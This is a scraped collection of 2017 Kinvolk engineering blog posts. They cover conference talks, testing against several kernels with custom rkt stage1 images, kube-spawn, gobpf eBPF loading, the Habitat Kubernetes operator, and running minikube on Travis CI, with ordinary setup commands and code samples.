{"website": "Kinvolk", "title": "Kinvolk Presenting at FOSDEM 2017", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Kinvolk\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/01/kinvolk-presenting-at-fosdem-2017/", "abstract": "The same procedure as last year, Miss Sophie? The same procedure as every year, James! As with every year, we’ve reserved the first weekend of February to attend FOSDEM , the premier open-source conference in Europe. We’re looking forward to having drinks and chatting with other open-source contributors and enthusiasts. But it’s not all fun and games for us. The Kinvolk team has three talks; one each in the Go , Testing and Automation , & Linux Containers and Microservices devrooms . The talks We look forward to sharing our work and having conversations about the following topics… gobpf - utilizing eBPF from Go by Michael in H.1302, Sunday at 10am. Testing web applications with traffic control in containers by Alban in H.2213, Sunday at 12:20. Running virtual machines in containers by Michał in UA2.220, Sunday at 16:10. If you’ll be there and are interested in those, or other projects we work on , please do track us down. We look forward to seeing you there!", "date": "2017-01-11"},
{"website": "Kinvolk", "title": "All Systems Go! - The Userspace Linux Conference", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/07/all-systems-go-the-userspace-linux-conference/", "abstract": "At Kinvolk we spend a lot of time working on and talking about the Linux userspace. We can regularly be found presenting our work at various events and discussing the details of our work with those who are interested. These events are usually either very generally about open source, or focused on a very specific technology, like containers , systemd , or ebpf . While these events are often awesome, and absolutely essential, they simply have a focus that is either too broad, or too specific. What we felt was missing was an event focused on the Linux userspace itself, and less on the projects and products built on top, or the kernel below. This is the focus of All Systems Go! and why we are excited to be a part of it. All Systems Go! is designed to be a community event. Tickets to All Systems Go! are affordable — starting at less than 30 EUR — and the event takes place during the weekend, making it more accessible to hobbyists and students. It’s also conveniently scheduled to fall between DockerCon EU in Copenhagen and Open Source Summit in Prague. Speakers To make All Systems Go! work, we’ve got to make sure that we get the people to attend who are working at this layer of the system, and on the individual projects that make up the Linux userspace. As a start, we’ve invited a first round of speakers, who also happen to be the CFP selection committee. We’re very happy to welcome to the All Systems Go! team… Alban Crequy : CTO @ Kinvolk Brian “Redbeard” Harrington : Chief Architect @ CoreOS Gianluca Borello : Chief Architect @ Sysdig Jon Boulle : Systems Software Engineer @ NStack & Advisor to CoreOS Lennart Poettering : Software Engineer @ Red Hat Martin Pitt : Debian Contributor Thomas Graf :  CTO @ Covalent.io Vincent Batts : Principal Software Engineer @ Red Hat While we’re happy to have this initial group of speakers, what’s really going to make All Systems Go! awesome are all the others in the community who submit their proposals and offer their perspectives and voices. Sponsorship Sponsors are crucial to open source community events. All Systems Go! is no different. In fact, sponsors are essential to keeping All Systems Go! an affordable and accessible event. We will soon be announcing our first round of sponsors. If your organization would like to be amongst that group please have a look at our sponsorship prospectus and get in touch . See you there! We’re looking forward to welcoming the Linux userspace community to Berlin. Hope to see you there!", "date": "2017-07-11"},
{"website": "Kinvolk", "title": "Using custom rkt stage1 images to test against various kernel versions", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Michael Schubert\n    \n    \n    /\n    \n    \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/02/using-custom-rkt-stage1-images-to-test-against-various-kernel-versions/", "abstract": "Introduction When writing software that is tightly coupled with the Linux kernel, it is necessary to test on multiple versions of the kernel. This is relatively easy to do locally with VMs, but when working on open-source code hosted on Github, one wants to make these tests a part of the project’s continuous integration (CI) system to ensure that each pull request runs the tests and passes before merging. Most CI systems run tests inside containers and, very sensibly, use various security mechanisms to restrict what the code being tested can access.  While this does not cause problems for most use cases, it does for us. It blocks certain syscalls that are needed to, say, test a container runtime like rkt , or load ebpf programs into the kernel for testing, like we need to do to test gobpf and tcptracer-bpf . It also doesn’t allow us to run virtual machines which we need to be able to do to run tests on different versions of the kernel. Finding a continuous integration service While working on the rkt project, we did a survey of CI systems to find the ones that we could use to test rkt itself. Because of the above-stated requirements, it was clear that we needed one that gave us the option to run tests inside a virtual machine. This makes the list rather small; in fact, we were left with only SemaphoreCI . SemaphoreCI supports running Docker inside of the test environment. This is possible because the test environment they provide for this is simply a VM. For rkt, this allowed us to run automatic tests for the container runtime each time a PR was submitted and/or changed. However, it doesn’t solve the problem of testing on various kernels and kernel configurations as we want for gobpf and tcptracer-bpf. Luckily, this is where rkt and its KVM stage1 come to the rescue. Our solution To continuously test the work we are doing on Weave Scope , tpctracer-bpf and gobpf , we not only need a relatively new Linux kernel, but also require a subset of features like CONFIG_BPF=y or CONFIG_HAVE_KPROBES=y to be enabled. With rkt’s KVM stage1 we can run our software in a virtual machine and, thanks to rkt’s modular architecture, build and use a custom stage1 suited to our needs. This allows us to run our tests on any platform that allows rkt to run; in our case, Semaphore CI . Building a custom rkt stage1 for KVM Our current approach relies on App Container Image (ACI) dependencies. All of our custom stage1 images are based on rkt’s coreos.com/rkt/stage1-kvm . In this way, we can apply changes to particular components (e.g. the Linux kernel) while reusing the other parts of the upstream stage1 image. An ACI manifest template for such an image could look like the following. { \"acKind\" : \"ImageManifest\" , \"acVersion\" : \"0.8.9\" , \"name\" : \"kinvolk.io/rkt/stage1-kvm-linux-{{kernel_version}}\" , \"labels\" : [\n                { \"name\" : \"arch\" , \"value\" : \"amd64\" },\n                { \"name\" : \"os\" , \"value\" : \"linux\" },\n                { \"name\" : \"version\" , \"value\" : \"0.1.0\" }\n        ], \"annotations\" : [\n                { \"name\" : \"coreos.com/rkt/stage1/run\" , \"value\" : \"/init\" },\n                { \"name\" : \"coreos.com/rkt/stage1/enter\" , \"value\" : \"/enter_kvm\" },\n                { \"name\" : \"coreos.com/rkt/stage1/gc\" , \"value\" : \"/gc\" },\n                { \"name\" : \"coreos.com/rkt/stage1/stop\" , \"value\" : \"/stop_kvm\" },\n                { \"name\" : \"coreos.com/rkt/stage1/app/add\" , \"value\" : \"/app-add\" },\n                { \"name\" : \"coreos.com/rkt/stage1/app/rm\" , \"value\" : \"/app-rm\" },\n                { \"name\" : \"coreos.com/rkt/stage1/app/start\" , \"value\" : \"/app-start\" },\n                { \"name\" : \"coreos.com/rkt/stage1/app/stop\" , \"value\" : \"/app-stop\" },\n                { \"name\" : \"coreos.com/rkt/stage1/interface-version\" , \"value\" : \"5\" }\n        ], \"dependencies\" : [\n                { \"imageName\" : \"coreos.com/rkt/stage1-kvm\" , \"labels\" : [\n                                { \"name\" : \"os\" , \"value\" : \"linux\" },\n                                { \"name\" : \"arch\" , \"value\" : \"amd64\" },\n                                { \"name\" : \"version\" , \"value\" : \"1.23.0\" }\n                        ]\n                }\n        ]\n} Note : rkt doesn’t automatically fetch stage1 dependencies and we have to pre-fetch those manually. To build a kernel ( arch/x86/boot/bzImage ), we use make bzImage after applying a single patch to the source tree. Without the patch, the kernel would block and not return control to rkt. # change directory to kernel source tree curl -LsS https://github.com/coreos/rkt/blob/v1.23.0/stage1/usr_from_kvm/kernel/patches/0001-reboot.patch -O\npatch --silent -p1 < 0001-reboot.patch # configure kernel make bzImage We now can combine the ACI manifest with a root filesystem holding our custom built kernel, for example: aci/4.9.4/\n├── manifest\n└── rootfs\n    └── bzImage We are now ready to build the stage1 ACI with actool : actool build --overwrite aci/4.9.4 my-custom-stage1-kvm.aci Run rkt with a custom stage1 for KVM rkt offers multiple command line flags to be provided with a stage1; we use --stage1-path= . To smoke test our newly built stage1, we run a Debian Docker container and call uname -r so we make sure our custom built kernel is actually used: rkt fetch image coreos.com/rkt/stage1-kvm:1.23.0 # due to rkt issue #2241 rkt run \\ --insecure-options = image \\ --stage1-path = ./my-custom-stage1-kvm.aci \\ docker://debian --exec = /bin/uname -- -r\n4.9.4-kinvolk-v1 [ ... ] We set CONFIG_LOCALVERSION=\"-kinvolk-v1\" in the kernel config and the version is correctly shown as 4.9.4-kinvolk-v1 . Run on Semaphore CI Semaphore does not include rkt by default on their platform. Hence, we have to download rkt in semaphore.sh as a first step: #!/bin/bash readonly rkt_version = \"1.23.0\" if [[ ! -f \"./rkt/rkt\" ]] || \\ [[ ! \" $( ./rkt/rkt version | awk '/rkt Version/{print $3}' ) \" == \" ${ rkt_version } \" ]] ; then curl -LsS \"https://github.com/coreos/rkt/releases/download/v ${ rkt_version } /rkt-v ${ rkt_version } .tar.gz\" \\ -o rkt.tgz\n\n  mkdir -p rkt\n  tar -xvf rkt.tgz -C rkt --strip-components = 1 fi [ ... ] After that we can pre-fetch the stage1 image we depend on and then run our tests. Note that we now use ./rkt/rkt . And we use timeout to make sure our tests fail if they cannot be finished in a reasonable amount of time. Example: sudo ./rkt/rkt image fetch --insecure-options = image coreos.com/rkt/stage1-kvm:1.23.0\nsudo timeout --foreground --kill-after = 10 5m \\ ./rkt/rkt \\ --uuid-file-save = ./rkt-uuid \\ --insecure-options = image,all-run \\ --stage1-path = ./rkt/my-custom-stage1-kvm.aci \\ ...\n  --exec = /bin/sh -- -c \\ 'cd /go/... ; \\ go test -v ./...' --uuid-file-save=./rkt-uuid is required to determine the UUID of the started container from semaphore.sh to read its exit status (since it is not propagated on the KVM stage1 ) after the test finished and exit accordingly: [ ... ] test_status = $( sudo ./rkt/rkt status $( <rkt-uuid ) | awk '/app-/{split($0,a,\"=\")} END{print a[2]}' ) exit $test_status Bind mount directories from stage1 into stage2 If you want to provide data to stage2 from stage1 you can do this with a small systemd drop-in unit to bind mount the directories. This allows you to add or modify content without actually touching the stage2 root filesystem. We did the following to provide the Linux kernel headers to stage2: # add systemd drop-in to bind mount kernel headers mkdir -p \" ${ rootfs_dir } /etc/systemd/system/ [email protected] \" cat <<EOF >\"${rootfs_dir}/etc/systemd/system/ [email protected] /10-bind-mount-kernel-header.conf\" [Service] ExecStartPost=/usr/bin/mkdir -p %I/${kernel_header_dir} ExecStartPost=/usr/bin/mount --bind \"${kernel_header_dir}\" %I/${kernel_header_dir} EOF Note : for this to work you need to have mkdir in stage1, which is not included in the default rkt stage1-kvm. We use the one from busybox: https://busybox.net/downloads/binaries/1.26.2-i686/busybox_MKDIR Automating the steps We want to be able to do this for many kernel versions. Thus, we have created a tool, stage1-builder , that does most of this for us. With stage1-builder you simply need to add the kernel configuration to the config directory and run the ./builder script. The result is an ACI file containing our custom kernel with a dependency on the upstream kvm-stage1. Conclusion With SemaphoreCI providing us with a proper VM and rkt’s modular stage1 architecture, we have put together a CI pipeline that allows us to test gobpf and tcptracer-bpf on various kernels. In our opinion this setup is much preferable to the alternative, setting up and maintaining Jenkins. Interesting to point out is that we did not have to use or make changes to rkt’s build system. Leveraging ACI dependencies was all we needed to swap out the KVM stage1 kernel. For the simple case of testing software on various kernel versions, rkt’s modular design has proven to be very useful.", "date": "2017-02-23"},
{"website": "Kinvolk", "title": "Introducing kube-spawn: a tool to create local, multi-node Kubernetes clusters", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/08/introducing-kube-spawn-a-tool-to-create-local-multi-node-kubernetes-clusters/", "abstract": "kube-spawn is a tool to easily start a local, multi-node Kubernetes cluster on a Linux machine. While its original audience was mainly developers of Kubernetes, it’s turned into a tool that is great for just trying Kubernetes out and exploring. This article will give a general introduction to kube-spawn and show how to use it. Overview kube-spawn aims to become the easiest means of testing and fiddling with Kubernetes on Linux. We started the project because it is still rather painful to start a multi-node Kubernetes cluster on our development machines. And the tools that do provide this functionality generally do not reflect the environments that Kubernetes will eventually be running on, a full Linux OS. Running a Kubernetes cluster with kube-spawn So, without further ado, let’s start our cluster. With one command kube-spawn fetches the Container Linux image, prepares the nodes, and deploys the cluster. Note that you can also do these steps individually with machinectl pull-raw , and the kube-spawn setup and init subcommands. But the up subcommand does this all for us. $ sudo GOPATH = $GOPATH CNI_PATH = $GOPATH /bin ./kube-spawn up --nodes = 3 When that command completes, you’ll have a 3-node Kubernetes cluster. You’ll need to wait for the nodes to be ready before its useful. $ export KUBECONFIG = $GOPATH /src/github.com/kinvolk/kube-spawn/.kube-spawn/default/kubeconfig\n$ kubectl get nodes\nNAME           STATUS    AGE       VERSION\nkube-spawn-0   Ready     1m        v1.7.0\nkube-spawn-1   Ready     1m        v1.7.0\nkube-spawn-2   Ready     1m        v1.7.0 Looks like all the nodes are ready. Let’s move on. The demo app In order to test that our cluster is working we’re going to deploy the microservices demo, Sock Shop , from our friends at Weaveworks . The Sock Shop is a complex microservices app that uses many components commonly found in real-world deployments. So it’s good to test that everything is working and gives us something more substantial to explore than a hello world app. Cloning the demo app To proceed, you’ll need to clone the microservices-demo repo and navigate to the deploy/kubernetes folder. $ cd ~/repos\n$ git clone https://github.com/microservices-demo/microservices-demo.git sock-shop\n$ cd sock-shop/deploy/kubernetes/ Deploying the demo app Now that we have things in place, let’s deploy. We first need to create the sock-shop namespace that the deployment expects. $ kubectl create namespace sock-shop\nnamespace \"sock-shop\" created With that, we’ve got all we need to deploy the app $ kubectl create -f complete-demo.yaml\ndeployment \"carts-db\" created\nservice \"carts-db\" created\ndeployment \"carts\" created\nservice \"carts\" created\ndeployment \"catalogue-db\" created\nservice \"catalogue-db\" created\ndeployment \"catalogue\" created\nservice \"catalogue\" created\ndeployment \"front-end\" created\nservice \"front-end\" created\ndeployment \"orders-db\" created\nservice \"orders-db\" created\ndeployment \"orders\" created\nservice \"orders\" created\ndeployment \"payment\" created\nservice \"payment\" created\ndeployment \"queue-master\" created\nservice \"queue-master\" created\ndeployment \"rabbitmq\" created\nservice \"rabbitmq\" created\ndeployment \"shipping\" created\nservice \"shipping\" created\ndeployment \"user-db\" created\nservice \"user-db\" created\ndeployment \"user\" created\nservice \"user\" created Once that completes, we still need to wait for all the pods to come up. $ watch kubectl -n sock-shop get pods\nNAME                            READY     STATUS    RESTARTS   AGE\ncarts-2469883122-nd0g1          1/1       Running 0 1m\ncarts-db-1721187500-392vt       1/1       Running 0 1m\ncatalogue-4293036822-d79cm      1/1       Running 0 1m\ncatalogue-db-1846494424-njq7h   1/1       Running 0 1m\nfront-end-2337481689-v8m2h      1/1       Running 0 1m\norders-733484335-mg0lh          1/1       Running 0 1m\norders-db-3728196820-9v07l      1/1       Running 0 1m\npayment-3050936124-rgvjj        1/1       Running 0 1m\nqueue-master-2067646375-7xx9x   1/1       Running 0 1m\nrabbitmq-241640118-8htht        1/1       Running 0 1m\nshipping-2463450563-n47k7       1/1       Running 0 1m\nuser-1574605338-p1djk           1/1       Running 0 1m\nuser-db-3152184577-c8r1f        1/1       Running 0 1m Accessing the sock shop When they’re all ready, we have to find out which port and IP address we use to access the shop. For the port, let’s see which port the front-end services is using. $ kubectl -n sock-shop get svc\nNAME           CLUSTER-IP       EXTERNAL-IP   PORT ( S ) AGE\ncarts          10.110.14.144    <none>        80/TCP         3m\ncarts-db       10.104.115.89    <none>        27017/TCP      3m\ncatalogue      10.110.157.8     <none>        80/TCP         3m\ncatalogue-db   10.99.103.79     <none>        3306/TCP       3m\nfront-end      10.105.224.192   <nodes>       80:30001/TCP   3m\norders         10.101.177.247   <none>        80/TCP         3m\norders-db      10.109.209.178   <none>        27017/TCP      3m\npayment        10.107.53.203    <none>        80/TCP         3m\nqueue-master   10.111.63.76     <none>        80/TCP         3m\nrabbitmq       10.110.136.97    <none>        5672/TCP       3m\nshipping       10.96.117.56     <none>        80/TCP         3m\nuser           10.101.85.39     <none>        80/TCP         3m\nuser-db        10.107.82.6      <none>        27017/TCP      3m Here we see that the front-end is exposed on port 30001 and it uses the external IP. This means that we can access the front-end services using any worker node IP address on port 30001. machinectl gives us each node’s IP address. $ machinectl\nMACHINE      CLASS     SERVICE        OS     VERSION  ADDRESSES\nkube-spawn-0 container systemd-nspawn coreos 1492.1.0 10.22.0.137...\nkube-spawn-1 container systemd-nspawn coreos 1492.1.0 10.22.0.138...\nkube-spawn-2 container systemd-nspawn coreos 1492.1.0 10.22.0.139... Remember, the first node is the master node and all the others are worker nodes. So in our case, we can open our browser to 10.22.0.138:30001 or 10.22.0.139:30001 and should be greeted by a shop selling socks. Stopping the cluster Once you’re done with your sock purchases, you can stop the cluster. $ sudo ./kube-spawn stop\n2017/08/10 01:58:00 turning off machines [ kube-spawn-0 kube-spawn-1 kube-spawn-2 ] ...\n2017/08/10 01:58:00 All nodes are stopped. A guided demo If you’d like a more guided tour, you’ll find it here. As mentioned in the video, kube-spawn creates a .kube-spawn directory in the current directory where you’ll find several files and directories under the default directory. In order to not be constrained by the size of each OS Container, we mount each node’s /var/lib/docker directory here. In this way, we can make use of the host’s disk space. Also, we don’t currently have a clean command. So you can run rm -rf .kube-spawn/ if you want to completely clean up things. Conclusion We hope you find kube-spawn as useful as we do. For us, it’s the easiest way to test changes to Kubernetes or spin up a cluster to explore Kubernetes. There are still lots of improvements (some very obvious) that can be made. PRs are very much welcome!", "date": "2017-08-10"},
{"website": "Kinvolk", "title": "An update on gobpf - ELF loading, uprobes, more program types", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Michael Schubert\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/09/an-update-on-gobpf-elf-loading-uprobes-more-program-types/", "abstract": "Almost a year ago we introduced gobpf , a Go library to load and use eBPF programs from Go applications. Today we would like to give you a quick update on the changes and features added since then (i.e. the highlights of git log --oneline --no-merges --since=\"November 30th 2016\" master ). Load BPF programs from ELF object files With commit 869e637 , gobpf was split into two subpackages ( github.com/iovisor/gobpf/bcc and github.com/iovisor/gobpf/elf ) and learned to load BPF programs from ELF object files. This allows users to pre-build their programs with clang/LLVM and its BPF backend as an alternative to using the BPF Compiler Collection . One project where we at Kinvolk used pre-built ELF objects is the TCP tracer that we wrote for Weave Scope . Putting the program into the library allows us to go get and vendor the tracer as any other Go dependency. Another important result of using the ELF loading mechanism is that the Scope container images are much smaller, as bcc and clang are not included and don’t add to the container image size. Let’s see how this is done in practice by building a demo program to log open(2) syscalls to the ftrace trace_pipe : // program.c #include <linux/kconfig.h> #include <linux/bpf.h> #include <uapi/linux/ptrace.h> // definitions of bpf helper functions we need, as found in // http://elixir.free-electrons.com/linux/latest/source/samples/bpf/bpf_helpers.h #define SEC(NAME) __attribute__((section(NAME), used)) #define PT_REGS_PARM1(x) ((x)->di) static int ( * bpf_probe_read)( void * dst, int size, void * unsafe_ptr) = ( void * ) BPF_FUNC_probe_read; static int ( * bpf_trace_printk)( const char * fmt, int fmt_size, ...) = ( void * ) BPF_FUNC_trace_printk; #define printt(fmt, ...)                                                   \\ ({                                                                 \\ char ____fmt[] = fmt;                                      \\ bpf_trace_printk(____fmt, sizeof(____fmt), ##__VA_ARGS__); \\ }) // the kprobe SEC( \"kprobe/SyS_open\" ) int kprobe__sys_open( struct pt_regs * ctx)\n{ char filename[ 256 ];\n\n        bpf_probe_read(filename, sizeof (filename), ( void * )PT_REGS_PARM1(ctx));\n\n        printt( \"open(%s) \\n \" , filename); return 0 ;\n} char _license[] SEC( \"license\" ) = \"GPL\" ; // this number will be interpreted by the elf loader // to set the current running kernel version __u32 _version SEC ( \"version\" ) = 0xFFFFFFFE ; On a Debian system, the corresponding Makefile could look like this: # Makefile # … uname = $( shell uname -r ) build-elf : clang \\ -D__KERNEL__ \\ -O2 -emit-llvm -c program.c \\ -I /lib/modules/ $( uname ) /source/include \\ -I /lib/modules/ $( uname ) /source/arch/x86/include \\ -I /lib/modules/ $( uname ) /build/include \\ -I /lib/modules/ $( uname ) /build/arch/x86/include/generated \\ -o - | \\ llc -march = bpf -filetype = obj -o program.o A small Go tool can then be used to load the object file and enable the kprobe with the help of gobpf: // main.go package main import ( \"fmt\" \"os\" \"os/signal\" \"github.com/iovisor/gobpf/elf\" ) func main () {\n        module := elf. NewModule ( \"./program.o\" ) if err := module. Load ( nil ); err != nil {\n                fmt. Fprintf (os.Stderr, \"Failed to load program: %v\\n\" , err)\n                os. Exit ( 1 )\n        } defer func () { if err := module. Close (); err != nil {\n                        fmt. Fprintf (os.Stderr, \"Failed to close program: %v\" , err)\n                }\n        }() if err := module. EnableKprobe ( \"kprobe/SyS_open\" , 0 ); err != nil {\n                fmt. Fprintf (os.Stderr, \"Failed to enable kprobe: %v\\n\" , err)\n                os. Exit ( 1 )\n        }\n\n        sig := make ( chan os.Signal, 1 )\n        signal. Notify (sig, os.Interrupt, os.Kill) <- sig\n} Now every time a process uses open(2) , the kprobe will log a message. Messages written with bpf_trace_printk can be seen in the trace_pipe “live trace”: sudo cat /sys/kernel/debug/tracing/trace_pipe With go-bindata it’s possible to bundle the compiled BPF program into the Go binary to build a single fat binary that can be shipped and installed conveniently. Trace user-level functions with bcc and uprobes Louis McCormack contributed support for uprobes in github.com/iovisor/gobpf/bcc and therefore it is now possible to trace user-level function calls. For example, to trace all readline() function calls from /bin/bash processes, you can run the bash_readline.go demo : sudo -E go run ./examples/bcc/bash_readline/bash_readline.go More supported program types for gobpf/elf gobpf/elf learned to load programs of type TRACEPOINT , SOCKET_FILTER , CGROUP_SOCK and CGROUP_SKB : Tracepoints A program of type TRACEPOINT can be attached to any Linux tracepoint . Tracepoints in Linux are “a hook to call a function (probe) that you can provide at runtime.” A list of available tracepoints can be obtained with find /sys/kernel/debug/tracing/events -type d . Socket filtering Socket filtering is the mechanism used by tcpdump to retrieve packets matching an expression. With SOCKET_FILTER programs, we can filter data on a socket by attaching them with setsockopt(2) . cgroups CGROUP_SOCK and CGROUP_SKB can be used to load and use programs specific to a cgroup. CGROUP_SOCK programs “run any time a process in the cgroup opens an AF_INET or AF_INET6 socket” and can be used to enable socket modifications. CGROUP_SKB programs are similar to SOCKET_FILTER and are executed for each network packet with the purpose of cgroup specific network filtering and accounting. Continuous integration We have setup continuous integration and written about how we use custom rkt stage1 images to test against various kernel versions . At the time of writing, gobpf has elementary tests to verify that programs and their sections can be loaded on kernel versions 4.4 , 4.9 and 4.10 but no thorough testing of all functionality and features yet (e.g. perf map polling). Miscellaneous With Linux 4.12, we have added a way to optionally specify the maximum number of active kretprobes to avoid probe misses. gobpf users can set the maxiumum with EnableKprobe() . gobpf/pkg now brings a couple of helper subpackages, for example bpffs to mount the BPF file system or cpuonline to detect all online CPUs. Numerous small improvements and bug fixes. Thanks to contributors and clients In closing, we’d like to thank all those who have contributed to gobpf. We look forward to merging more commits from contributors and seeing how others make use of gopbf. A special thanks goes to Weaveworks for funding the work from which gobpf was born. Continued contributions have been possible through other clients, for whom we are helping build products (WIP) that leverage gobpf.", "date": "2017-09-06"},
{"website": "Kinvolk", "title": "Habitat Operator - Running Habitat Services with Kubernetes", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      lili-cosic\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/10/habitat-operator-running-habitat-services-with-kubernetes/", "abstract": "For the last few months, we’ve been working with the Habitat team at Chef to make Habitat-packaged applications run well in Kubernetes . The result of this collaboration is the Habitat Operator , a Kubernetes controller used to deploy, configure and manage applications packaged with Habitat inside of Kubernetes. This article will give an overview of that work — particularly the issues to address, solutions to those issues, and future work. Habitat Overview For the uninitiated, Habitat is a project designed to address building, deploying and running applications. Building applications Applications are built from shell scripts known as “plans” which describe how to build the application, and may optionally include configurations files and lifecycle hooks. From the information in the plan, Habitat can create a package of the application. Deploy applications In order to run an application with a container runtime like Docker or rkt , Habitat supports exporting packages to a Docker container image. You can then upload the container image to a registry and use it to deploy applications to a container orchestration system like Kubernetes. Running applications Applications packaged with Habitat — hereafter referred to as simply as applications — support the following runtime features. Topology models Update strategies Dynamic configuration Health monitoring Application binding These features are available because all Habitat applications run under a supervisor process called a Supervisor . The Supervisor takes care of restarting, reconfiguring and gracefully terminating services. The Supervisor also allows multiple instances of applications to run with the Supervisor communicating with other Supervisors via a gossip protocol . These can connect to form a ring and establish Service Groups for sharing configuration data and establishing topologies. Integration with Kubernetes Many of the features that Habitat provides overlap with features that are provided in Kubernetes. Where there is overlap, the Habitat Operator tries to translate, or defer, to the Kubernetes-native mechanism. One design goal of the Habitat Operator is to allow Kubernetes users to use the Kubernetes CLI without fear that Habitat applications will become out of sync. For example, update strategies are core feature of Kubernetes and should be handled by Kubernetes. For the features that do not overlap — such as topologies and application binding — the Habitat Operator ensures that these work within Kubernetes. Joining the ring One of the fundamental challenges we faced when conforming Habitat to Kubernetes was forming and joining a ring. Habitat uses the --peer flag which is passed an IP address of a previously started Supervisor. But in the Kubernetes world this is not possible as all pods need to be started with the exact same command line flags. In order to be able to do this within Kubernetes, implemented a new flag in Habitat itself, --peer-watch-file . This flag takes a file which should contain a list of one or more IP addresses to the peers in the Service Group it would like to join. Habitat uses this information to form the ring between the Supervisors. This is implemented in the Habitat Operator using a Kubernetes ConfigMap which is mounted into each pod. Initial Configuration Habitat allows for drawing configuration information from different sources. One of them is a user.toml file which is used for initial configuration and is not gossiped within the ring. Because there can be sensitive data in configuration files, we use Kubernetes Secrets for all configuration data. The Habitat Operator mounts configuration files in the place where Habitat expects it to be found and the application automatically picks up this configuration as it normally would. This mechanism will also be reused to support configuration updates in the future. Topologies One of these is specifying the two different topologies that are supported in Habitat. The standalone topology — the default topology in Habitat — is used for applications that are independent of one another. With the leader/follower topology, the Supervisor handles leader election over the ring before the application starts. For this topology, three or more instances of an application must be available for a successful leader election to take place. Ring encryption A security feature of Habitat that we brought into the operator is securing the ring by encrypting all communications across the network. Application binding We also added an ability to do runtime binding, meaning that applications form a producer/consumer relationship at application start. The producer exports the configuration and the consumer, through the Supervisor ring, consumes that information. You can learn more about that in the demo below: Future plans for Habitat operator The Habitat Operator is in heavy development and we’re excited about the features that we have planned for the next months. Export to Kubernetes We’ve already started work on a exporter for Kubernetes. This will allow you to export the application you packaged with Habitat to a Docker image along with a generated manifest file that can be used to deploy directly to Kubernetes. Dynamic configuration As mentioned above, we are planning to extend the initial configuration and use the same logic for configuration updates. This work should be landing in Habitat very soon. With Habitat applications, configuration changes can be made without restarting pods. The behaviour for how to do configuration updates is defined in the applications Habitat plan. Further Kubernetes integration and demos We’re also looking into exporting to Helm charts in the near future. This could allow for bringing a large collection of Habitat-packaged to Kubernetes. Another area to explore is integration between the Habitat Builder and Kubernetes. The ability to automatically recompile application, export images, and deploy to Kubernetes when dependencies are updated could bring great benefits to Habitat and Kubernetes users alike. Conclusion Please take the operator for a spin here . The first release is now available. All you need is an application packaged with Habitat and exported as Docker image, and that functionality is already in Habitat itself. Note: The Habitat operator is compatible with Habitat version 0.36.0 onwards. If you have any questions feel free to ask on the #kubernetes channel in Habitat slack or open an issue on the Habitat operator. Follow Kinvolk on twitter to get notified when new blog posts go live.", "date": "2017-10-09"},
{"website": "Kinvolk", "title": "Running Kubernetes on Travis CI with minikube", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      lili-cosic\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2017/10/running-kubernetes-on-travis-ci-with-minikube/", "abstract": "It is not easily possible to run Kubernetes on Travis CI , as most methods of setting up a cluster need to create resources on AWS, or another cloud provider. And setting up VMs is also not possible as Travis CI doesn’t allow nested virtualization. This post explains how to use minikube without additional resources, with a few simple steps. Our use case As we are currently working with Chef on a project to integrate Habitat with Kubernetes( Habitat Operator ), we needed a way to run the end-to-end tests on every pull request. Locally we use minikube , a tool to setup a local one-node Kubernetes cluster for development, or when we need a multi-node cluster, kube-spawn . But for automated CI tests we only currently require a single node setup. So we decided to use minikube to be able to easily catch any failed tests and debug and reproduce those locally. Typically minikube requires a virtual machine to setup Kubernetes. One day this tweet was shared in our Slack. It seems that minikube has a not-so-well-documented way of running Kubernetes with no need for virtualization as it sets up localkube , a single binary for kubernetes that is executed in a Docker container and Travis CI already has Docker support. There is a warning against running this locally, but since we only use it on Travis CI, in an ephemeral environment, we concluded that this is an acceptable use case. The setup So this is what our setup looks like. Following is the example .travis.yml file: sudo : required env : - CHANGE_MINIKUBE_NONE_USER=true before_script : - curl -Lo kubectl https://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo mv kubectl /usr/local/bin/ - curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 && chmod +x minikube && sudo mv minikube /usr/local/bin/ - sudo minikube start --vm-driver=none --kubernetes-version=v1.7.0 - minikube update-context - JSONPATH='{range .items[*]}{@.metadata.name}:{range @.status.conditions[*]}{@.type}={@.status};{end}{end}'; until kubectl get nodes -o jsonpath=\"$JSONPATH\" 2>&1 | grep -q \"Ready=True\"; do sleep 1; done How it works First, it installs kubectl , which is a requirement of minikube. The need for sudo: required comes from minikube’s starting processes, which requires to be root . Having set the environment variable CHANGE_MINIKUBE_NONE_USER , minikube will automatically move config files to the appropriate place as well as adjust the permissions respectively. When using the none driver, the kubectl config and credentials generated will be owned by root and will appear in the root user’s home directory. The none driver then does the heavy lifting of setting up localkube on the host. Then the kubeconfig is updated with minikube update-context . And lastly we wait for Kubernetes to be up and ready. Examples This work is already being used in the Habitat Operator . For a simple live example setup have a look at this repo . If you have any questions feel free to ping me on twitter @LiliCosic . Follow Kinvolk on twitter to get notified when new blog posts go live.", "date": "2017-10-13"},
